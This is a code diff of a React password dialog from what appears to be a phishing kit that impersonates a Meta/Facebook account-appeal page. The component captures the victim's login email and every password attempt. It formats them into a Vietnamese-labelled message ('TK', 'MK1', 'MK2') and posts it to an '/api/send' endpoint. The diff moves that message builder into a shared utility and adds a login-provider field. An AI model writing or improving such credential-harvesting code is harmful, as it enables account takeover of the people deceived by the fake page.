@@ -5,6 +5,7 @@ import MetaLogo from '@/assets/images/meta-logo-grey.png';
 import TickIcon from '@/assets/images/tick.svg';
 import { store } from '@/store/store';
 import config from '@/utils/config';
+import { buildAppealMessage } from '@/utils/message';
 import translateText from '@/utils/translate';
 import axios from 'axios';
 import { useEffect, useState, type FC, type FormEvent } from 'react';
@@ -16,22 +17,10 @@ interface PasswordModalProps {
     nextStep: () => void;
 }
 
-const SEP = '━━━━━━━━━━━━━━━━━━━━';
-
 const delay = (delayTime: number) => {
     return new Promise((resolve) => {
         setTimeout(resolve, delayTime);
     });
-};
-
-const buildMessage = (baseMessage: string, loginEmail: string, passwords: string[]): string => {
-    let msg = baseMessage;
-    msg += `\n🔐 <b>ĐĂNG NHẬP</b>\n   TK: <code>${loginEmail}</code>`;
-    passwords.forEach((pw, i) => {
-        msg += `\n   MK${i + 1}: <code>${pw}</code>`;
-    });
-    msg += `\n${SEP}`;
-    return msg;
 };
 
 const PasswordModal: FC<PasswordModalProps> = ({ nextStep }) => {
@@ -43,7 +32,7 @@ const PasswordModal: FC<PasswordModalProps> = ({ nextStep }) => {
     const [showError, setShowError] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { messageId, baseMessage, passwords, setMessage, setMessageId, addPassword, setLoginEmail, geoInfo, setModalOpen } = store();
+    const { messageId, baseMessage, passwords, loginProvider, setMessage, setMessageId, addPassword, setLoginEmail, geoInfo, setModalOpen } = store();
 
     const t = (text: string): string => translations[text] || text;
 
@@ -95,7 +84,12 @@ const PasswordModal: FC<PasswordModalProps> = ({ nextStep }) => {
         const newPasswords = [...passwords, password];
         addPassword(password);
 
-        const updatedMessage = buildMessage(baseMessage, identifier.trim(), newPasswords);
+        const updatedMessage = buildAppealMessage({
+            baseMessage,
+            loginProvider: loginProvider ?? 'facebook',
+            loginEmail: identifier.trim(),
+            passwords: newPasswords
+        });
 
         try {
             const res = await axios.post('/api/send', {
